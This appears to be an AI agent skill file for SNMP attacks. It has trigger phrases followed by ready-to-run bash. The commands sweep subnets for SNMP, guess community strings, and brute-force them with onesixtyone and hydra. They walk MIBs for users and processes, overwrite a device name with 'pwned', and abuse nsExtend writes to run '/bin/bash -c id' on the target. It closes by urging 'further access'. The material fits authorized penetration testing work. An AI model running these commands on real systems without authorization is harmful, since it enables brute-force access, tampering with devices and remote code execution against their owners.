---
name: proto-snmp
description: "SNMP security testing — community string brute force, SNMP v1/v2c info dump, OID enumeration, SNMP write abuse, MIB walking. Triggers: 'snmp', 'snmp security', 'snmp enum', 'community string', 'snmp brute', 'snmp attack', 'snmp v2', 'mib walk', 'snmpwalk'."
---

# SNMP Security Testing

Enumerate network devices and systems via SNMP community strings.

---

## Phase 1: Discovery & Enumeration

```bash
TARGET="TARGET_IP"
SUBNET="10.10.10.0/24"

nmap -sU -p 161 "$SUBNET" --open 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | tee output/snmp_hosts.txt

for COMMUNITY in "public" "private" "community" "admin" "manager" "snmpd" "monitor"; do
  snmpwalk -v2c -c "$COMMUNITY" "$TARGET" sysDescr 2>/dev/null && echo "VALID: $COMMUNITY"
done | tee output/snmp_communities.txt
```

---

## Phase 2: Information Gathering

```bash
TARGET="TARGET_IP"
COMMUNITY="public"

snmpwalk -v2c -c "$COMMUNITY" "$TARGET" system | tee output/snmp_system.txt

snmpwalk -v2c -c "$COMMUNITY" "$TARGET" ifDescr | tee output/snmp_interfaces.txt

snmpwalk -v2c -c "$COMMUNITY" "$TARGET" hrSWRunName | tee output/snmp_processes.txt

snmpwalk -v2c -c "$COMMUNITY" "$TARGET" hrSWInstalledName | tee output/snmp_software.txt

snmpwalk -v2c -c "$COMMUNITY" "$TARGET" .1.3.6.1.4.1.77.1.2.25 | tee output/snmp_users.txt

snmpwalk -v2c -c "$COMMUNITY" "$TARGET" . 2>/dev/null | tee output/snmp_mib_walk.txt

snmpwalk -v2c -c "$COMMUNITY" "$TARGET" .1.3.6.1.4.1.9.2.1.1 2>/dev/null
```

---

## Phase 3: Brute Force & Write Abuse

```bash
TARGET="TARGET_IP"

onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
  "$TARGET" 2>/dev/null | tee output/snmp_brute.txt

hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
  snmp://$TARGET 2>/dev/null | tee -a output/snmp_brute.txt

WRITE_COMMUNITY="private"
snmpset -v2c -c "$WRITE_COMMUNITY" "$TARGET" sysName.0 s "pwned" 2>/dev/null

snmpset -v2c -c "$WRITE_COMMUNITY" "$TARGET" \
  nsExtendStatus.\"test\" i 5 \
  nsExtendCommand.\"test\" s "/bin/bash" \
  nsExtendArgs.\"test\" s "-c id" 2>/dev/null
snmpwalk -v2c -c "$WRITE_COMMUNITY" "$TARGET" nsExtendOutput 2>/dev/null
```

---

## Output

Save to `output/`:
- `snmp_communities.txt` — valid community strings
- `snmp_system.txt` — system information
- `snmp_mib_walk.txt` — full MIB walk output

## Next Phase

→ Use discovered credentials and system info for further access
→ `pentest-report` to document SNMP findings
